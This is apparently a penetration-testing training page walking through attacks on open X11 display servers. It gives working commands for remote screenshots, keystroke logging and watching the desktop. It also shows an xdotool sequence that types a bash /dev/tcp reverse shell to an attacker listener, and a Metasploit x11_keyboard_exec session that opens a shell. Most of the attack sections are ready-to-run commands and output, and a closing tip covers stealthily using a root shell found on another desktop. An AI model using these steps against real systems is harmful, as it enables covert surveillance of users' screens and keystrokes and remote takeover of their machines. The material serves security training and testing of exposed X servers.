# X11 Hacking

https://zachgrace.com/training/X11.html

## Attacker Setup

Install some required packages:
```
apt-get install x11-utils xutils-dev imagemagick libxext-dev xspy
```
## Installing xwatchwin
```
wget http://www.ibiblio.org/pub/X11/contrib/utilities/xwatchwin.tar.gz
tar zxvf xwatchwin.tar.gz
cd xwatchwin/
xmkmf && make && make install
```
## Reconnaissance

X11 generally runs on ports 6000-60063, however it’s most typically found on ports 6000-6002. We can use Nmap to scan for and identify X11.
```
root@pwnlab-kali-mini:~# nmap -sV -n -v -p 6000-6002 172.16.31.102

Starting Nmap 6.47 ( http://nmap.org ) at 2016-02-02 22:29 EST
NSE: Loaded 29 scripts for scanning.
Initiating ARP Ping Scan at 22:29
Scanning 172.16.31.102 [1 port]
Completed ARP Ping Scan at 22:29, 0.00s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:29
Scanning 172.16.31.102 [3 ports]
Discovered open port 6000/tcp on 172.16.31.102
Completed SYN Stealth Scan at 22:29, 0.00s elapsed (3 total ports)
Initiating Service scan at 22:29
Scanning 1 service on 172.16.31.102
Completed Service scan at 22:29, 6.01s elapsed (1 service on 1 host)
NSE: Script scanning 172.16.31.102.
Nmap scan report for 172.16.31.102
Host is up (0.00044s latency).
PORT     STATE  SERVICE VERSION
6000/tcp open   X11     X.Org (open)
6001/tcp closed X11:1
6002/tcp closed X11:2
MAC Address: 08:00:27:1A:F3:00 (Cadmus Computer Systems)
Service Info: OS: Unix

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.21 seconds
           Raw packets sent: 4 (160B) | Rcvd: 4 (152B)
```
## Gathering Window Info
Before we start exploiting the system, it’s useful to gather some information about the windows. The xwininfo command
```t
root@pwnlab-kali-mini:~# xwininfo -root -tree -display 172.16.31.102:0

xwininfo: Window id: 0x101 (the root window) (has no name)

  Root window id: 0x101 (the root window) (has no name)
  Parent window id: 0x0 (none)
     40 children:
     0x30002a7 "update-manager": ()  10x10+-100+-100  +-100+-100
     0x3000003 (has no name): ("update-manager" "Update-manager")  254x98+0+0  +0+0
        1 child:
        0x3000004 (has no name): ()  1x1+-1+-1  +-1+-1
     0x3000001 "update-manager": ("update-manager" "Update-manager")  10x10+10+10  +10+10
        1 child:
        0x3000002 (has no name): ()  1x1+-1+-1  +9+9
     0x2e00003 "update-notifier": ()  10x10+-100+-100  +-100+-100
     0x2e00001 "update-notifier": ("update-notifier" "Update-notifier")  10x10+10+10  +10+10
        1 child:
        0x2e00002 (has no name): ()  1x1+-1+-1  +9+9
     0x2c00001 "applet.py": ("applet.py" "Applet.py")  10x10+10+10  +10+10
        1 child:
        0x2c00002 (has no name): ()  1x1+-1+-1  +9+9
     0x1c00001 (has no name): ()  10x10+-20+-20  +-20+-20
     0xe00001 "Terminal": ("gnome-terminal" "Gnome-terminal")  10x10+10+10  +10+10
        1 child:
        0xe00002 (has no name): ()  1x1+-1+-1  +9+9
     0x1200068 (has no name): ()  10x10+0+0  +0+0
```
## Screenshot The Display

The xwd tool can be used to create a screenshot of the remote desktop.

```
xwd -root -screen -silent -display 10.10.10.10:0 > screenshot.xwd
convert screenshot.xwd screenshot.png
```

## Exploitation

### Keystroke logging

Keystroke logging can be accomplished using the xspy tool.

```
root@pwnlab-kali-mini:~# xspy
opened 172.16.31.102:0 for snoopng
test
```

### Watching The Display

To watch the display, you can use xwatchwin to watch a specific window or the entire desktop using the root window identifier.

```
./xwatchwin -u 0.5 172.16.31.102:0 root
```

### Getting Shell

#### Method 1: xdotool

```
xdotool key alt+F2
xdotool type 'xterm'
xdotool key KP_Enter
xdotool type --delay 50 'bash -i >& /dev/tcp/192.168.59.10/4444 0>&1'
xdotool key KP_Enter
```

On the attacker machine, catch the reverse shell:
```
nc -lnvp 4444

listening on [any] 4444 ...
connect to [192.168.59.10] from (UNKNOWN) [192.168.59.3] 52876
vagrant@pwnlab-x11:~$
```
#### Method 2: Metasploit
A recent Metasploit module was released and has simplified this attack by registering a virtual keyboard, then typing in the specified payload.
```
016-02-03 07:07:30 - S:0 J:0  > use exploit/unix/x11/x11_keyboard_exec
2016-02-03 07:07:32 - S:0 J:0  exploit(x11_keyboard_exec) > show options

Module options (exploit/unix/x11/x11_keyboard_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOST      172.16.31.102    yes       The target address
   RPORT      6000             yes       The target port
   TIME_WAIT  5                yes       Time to wait for opening GUI windows in seconds


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.59.10    yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   xterm (Generic)


2016-02-03 07:07:36 - S:0 J:0  exploit(x11_keyboard_exec) > set LHoST 192.168.59.10
LHoST => 192.168.59.10
2016-02-03 07:07:52 - S:0 J:0  exploit(x11_keyboard_exec) > exploit

[*] Started reverse TCP handler on 192.168.59.10:4444
[*] 172.16.31.102:6000 - Register keyboard
[*] 172.16.31.102:6000 - Opening "Run Application"
[*] 172.16.31.102:6000 - Waiting 5 seconds...
[*] 172.16.31.102:6000 - Opening xterm
[*] 172.16.31.102:6000 - Waiting 5 seconds...
[*] 172.16.31.102:6000 - Typing and executing payload
[*] Command shell session 1 opened (192.168.59.10:4444 -> 192.168.59.3:61742) at 2016-02-03 07:09:20 -0600

id
uid=1000(vagrant) gid=1000(vagrant) groups=4(adm),20(dialout),24(cdrom),46(plugdev),108(lpadmin),109(sambashare),110(admin),1000(vagrant)
```
### Don’t Forget About Desktops!

Most Linux window managers have multiple desktops. I’ve come across an open X11 server on an engagement with nothing on the first desktop, but a root shell on a different one. Using the xdotool, you can change which desktop you’re viewing and manipulating. Be warned, This desktop switch would be visible to anyone else viewing the desktop.

```
export DISPLAY=172.16.31.102:0
xdotool get_desktop
0
xdotool set_desktop 1
```

A stealither way of exploiting this root shell would be to comb through the xwininfo output, and using the window option of xdotool to send commands directly to the window.

## References

https://barcodereader.wordpress.com/2009/02/19/how-to-secertly-watch-in-x/
http://x8x.net/2014/09/16/x11-pentesting-techniques/
http://pipefish.me/2012/08/28/spying-on-screens-and-keystrokes-the-dangers-of-open-x11/
http://colesec.inventedtheinternet.com/more-x11-hacking-with-xspy-and-xwatchwin/

tags: #linux #links #pentest 
